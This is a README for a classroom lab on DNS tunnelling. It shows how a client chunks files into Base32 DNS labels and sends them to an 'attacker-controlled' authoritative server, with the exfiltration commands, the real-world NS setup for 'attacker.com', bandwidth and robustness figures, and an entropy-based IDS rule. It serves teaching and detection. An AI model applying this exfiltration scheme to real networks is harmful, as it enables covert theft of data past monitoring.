# DNS Tunnel Lab – Foundations of Cybersecurity

## Architecture

```
[Client 10.10.0.100]
   │  DNS queries: <b32_chunk>.<seq>.<total>.<session>.tunnel.lab
   │
   ▼
[Unbound resolver 10.10.0.2]          ← stub-zone delegation
   │  (mirrors a real NS delegation for attacker.com)
   │
   ▼
[Authoritative server 10.10.0.10]     ← attacker-controlled
   │  Reconstructs payload from chunks
   ▼
  [logs/server_events.jsonl] & [logs/received.txt]
```

## Quick start

```bash
# Requires: Docker + Docker Compose

chmod +x run_experiment.sh
./run_experiment.sh
```

Or step by step:

```bash
docker compose up -d --build

# 1. Exfiltrate a text file (using the mounted ./data directory)
docker exec -it dns_client python client.py --file /data/input.txt

# Or exfiltrate a custom inline message
docker exec -it dns_client python client.py --send "top secret data"

# 2. Check the raw query events logged by the authoritative server
docker exec dns_authoritative tail -n 20 /logs/server_events.jsonl

# 3. Check the reassembled and decoded text file on the authoritative server
# (Also directly accessible on host at ./logs/received.txt)
docker exec dns_authoritative cat /logs/received.txt

# 4. Run all measurements (bandwidth + robustness)
docker exec -it dns_client python client.py --measure

# 5. Detectability analysis only (no network needed)
docker exec -it dns_client python metrics.py
```

## Realistic DNS configuration (Slide 9 note)

In the lab: Unbound has a `stub-zone` for `tunnel.lab` pointing to 10.10.0.10.  
In a real attack: attacker registers `attacker.com`, adds:
```
attacker.com.   NS   ns1.attacker.com.
ns1.attacker.com.  A   <VPS public IP>
```
Every corporate resolver then naturally forwards `*.attacker.com` queries
to the attacker's VPS. The lab mirrors this logic exactly.

## Encoding & Transmission scheme (Slide 7 connection)

```
Payload (bytes)  →  Base32  →  30-char chunks  →  DNS labels
"secret"         →  "ON2XEZI=" →  ["on2xezi"]  →  on2xezi.0.1.s1.tunnel.lab
```

* **Query format**: `<b32_chunk>.<seq>.<total>.<session>.tunnel.lab`
  * `<b32_chunk>`: Base32-encoded slice of the file/payload (up to 30 characters).
  * `<seq>`: Zero-based sequence number of the chunk.
  * `<total>`: Total number of chunks in this transmission.
  * `<session>`: Session identifier (default: `s1`).
* **Base32 charset**: uses only `[a-z2-7]`, which is a valid DNS label charset.
* **Max label length**: 63 chars → 63 chars × 5 bits/char = ~315 bits ≈ 39 bytes/query.
* **Reassembly**: As each query arrives, the authoritative server logs the chunk into `/logs/server_events.jsonl` and responds with `A 1.0.0.1` (ACK). Once all `<total>` chunks have arrived, the server automatically sorts them, decodes the Base32 payload, and saves the original text to `/logs/received.txt`.

## Volumes & File Access

* **Input (`./data:/data`)**: Place any text file in `./data/` on the host, and reference it from the client container as `/data/<filename>` (e.g. `/data/input.txt`).
* **Output (`./logs:/logs`)**: The authoritative server writes `/logs/server_events.jsonl` and `/logs/received.txt`. Both are immediately available on the host inside the `./logs/` folder.

## Expected measurements for slides 10–11

### Bandwidth
| Payload | Expected avg |
|---------|-------------|
| 64 B    | ~15–25 B/s  |
| 256 B   | ~20–30 B/s  |
| 1024 B  | ~20–30 B/s  |

Bottleneck: `INTER_QUERY = 0.05 s` × chunk size → ~600 B/s theoretical max.
Actual: lower due to RTT and resolver overhead.
Note: legitimate DNS traffic has >1000× higher bandwidth → channel is very slow.

### Robustness
| Packet loss | Expected delivery rate |
|-------------|----------------------|
| 0%          | ~100%                |
| 5%          | ~95%                 |
| 10%         | ~90%                 |
| 20%         | ~80%                 |

No retransmission in this implementation → delivery rate ≈ 1 − loss_rate.
Real tools (iodine, dnscat2) add retransmission → better robustness at cost of bandwidth.

### Detectability
| Feature                    | Normal DNS | Tunnel DNS |
|----------------------------|-----------|-----------|
| Label entropy (bits/char)  | ~2.5      | ~4.7      |
| Avg label length (chars)   | ~5        | ~30       |
| Same domain queries/min    | <10       | >200      |

A simple IDS rule: `entropy(label) > 3.5 OR len(label) > 20` → suspicious.
